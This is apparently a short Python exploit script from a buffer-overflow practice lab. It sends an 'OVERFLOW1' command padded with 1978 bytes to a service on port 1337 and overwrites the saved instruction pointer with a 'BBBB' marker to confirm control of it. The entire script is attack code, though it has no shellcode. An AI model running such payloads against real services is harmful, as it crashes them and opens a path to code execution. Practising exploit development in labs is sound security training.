#!/usr/bin/python3
import socket

host, port = "10.10.61.109", 1337

cmd = b"OVERFLOW1 "
pattern_length = 2000 # Documentation and keep for length retention
offset = 1978
new_eip = b"BBBB"

payload = b"".join([
            cmd,
            b"A" * offset,
            new_eip,
            b"C" *  ( pattern_length - len(new_eip) - offset),
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)
    #s.recv(4096).decode("utf-8").strip()

